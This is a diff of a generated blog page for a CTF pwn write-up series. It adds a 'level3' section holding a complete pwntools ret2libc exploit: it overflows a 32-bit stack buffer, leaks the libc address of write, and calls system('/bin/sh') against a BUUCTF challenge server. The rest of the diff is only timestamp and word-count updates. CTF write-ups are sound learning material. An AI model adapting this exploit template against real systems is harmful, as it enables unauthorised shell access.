@@ -83,7 +83,7 @@
                         <input id="switch_default" type="checkbox" class="switch_default">
                         <label for="switch_default" class="toggleBtn"></label>
             </div>
-            <form id="gridea-search-form" data-update="1602207099310" action="/search/index.html">
+            <form id="gridea-search-form" data-update="1602207726640" action="/search/index.html">
                 <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
             </form>
         </div>
@@ -102,7 +102,7 @@
                         <!--zh-->
                         <a id="mobile-toggle-theme-zh" class="a zh">&nbsp;&#x6697;&#x9ED1;</a>
                     </div>
-                    <form id="gridea-search-form" data-update="1602207099310" action="/search/index.html">
+                    <form id="gridea-search-form" data-update="1602207726640" action="/search/index.html">
                         <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
                     </form>
                     <!--en-->
@@ -178,9 +178,9 @@
                                 Date: <a href="#">2020-09-07</a>
                             </span>
                                     <span class="post-readtime">Reading Time:<a
-                                    href="#">6.0
+                                    href="#">6.7
                                     mins</a></span>
-                                    <span class="post-words">words:<a href="#">1147</a></span>
+                                    <span class="post-words">words:<a href="#">1262</a></span>
                                     
                                         <span class="post-category">
                                 Category:
@@ -520,6 +520,49 @@ add(-5,p32(backdoor))
 
 p.interactive()
 </code></pre>
+<h2 id="level3">level3</h2>
+<p>exp:</p>
+<pre><code class="language-python">
+from pwn import *
+from LibcSearcher import *
+local = 0
+
+binary = &quot;./level3&quot;
+
+if local == 1:
+	p = process(binary)
+else:
+	p = remote(&quot;node3.buuoj.cn&quot;,29373)
+
+def dbg():
+	context.log_level = 'debug'
+
+context.terminal = ['tmux','splitw','-h']
+
+elf = ELF('./level3')
+write_plt = elf.plt['write']
+write_got = elf.got['write']
+main = elf.sym['main']
+
+payload = 0x8c * 'a' + p32(write_plt) + p32(main) + p32(1) + p32(write_got) + p32(0x4)
+
+p.recvuntil(':')
+p.send(payload)
+write = u32(p.recvuntil('\xf7')[-4:])
+print hex(write)
+
+libc = LibcSearcher('write',write)
+libc_base = write - libc.dump('write')
+
+system = libc_base + libc.dump('system')
+binsh = libc_base + libc.dump('str_bin_sh')
+
+payload = 0x8c * 'a' + p32(system) + 'hack' + p32(binsh)
+p.recvuntil(':')
+p.send(payload)
+
+p.interactive()
+</code></pre>
 
                         </div>
                         
@@ -535,6 +578,7 @@ p.interactive()
 <li><a href="#bjdctf_2020_ydsneedgrirlfriend">bjdctf_2020_YDSneedGrirlfriend</a></li>
 <li><a href="#pwnable_orw">pwnable_orw</a></li>
 <li><a href="#wustctf2020_name_your_cat">wustctf2020_name_your_cat</a></li>
+<li><a href="#level3">level3</a></li>
 </ul>
 </li>
 </ul>
@@ -568,8 +612,8 @@ p.interactive()
                                                     <i class="post-share"></i>
                                                     <span>Share:</span>
                                                         <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://l3mon629.github.io/post/buu-pwn2/"><i class="fa fa-qrcode"></i></a>
-                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://l3mon629.github.io/post/buu-pwn2/&sharesource=qzone&title=buu-pwn(2)&pics=https://l3mon629.github.io/images/avatar.png?v=1602207099310&summary="><i class="fa fa-qq"></i></a>
-                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://l3mon629.github.io/post/buu-pwn2/&sharesource=weibo&title=buu-pwn(2) + " - " + &pic="https://l3mon629.github.io/images/avatar.png?v=1602207099310 "><i class="fa fa-weibo "></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://l3mon629.github.io/post/buu-pwn2/&sharesource=qzone&title=buu-pwn(2)&pics=https://l3mon629.github.io/images/avatar.png?v=1602207726640&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://l3mon629.github.io/post/buu-pwn2/&sharesource=weibo&title=buu-pwn(2) + " - " + &pic="https://l3mon629.github.io/images/avatar.png?v=1602207726640 "><i class="fa fa-weibo "></i></a>
                                                         
                                                                 </span>
                                                                 <!--en-->
@@ -677,7 +721,7 @@ p.interactive()
                     CheckVersion();
                     
                     var newDate = new Date();
-                    newDate.setTime(1602207099310);
+                    newDate.setTime(1602207726640);
                     console.log(" Blog Update Time: " + newDate.toLocaleDateString());
                     console.log("\n %c \u26a1Theme:Chic Author's Blog:https://blog.itjoker.cn  Write By ITJoker  \n\n", "color: #ffffff; background: rgba(49, 49, 49, 0.85); padding:5px 0;border-radius:5px;");
                 </script>
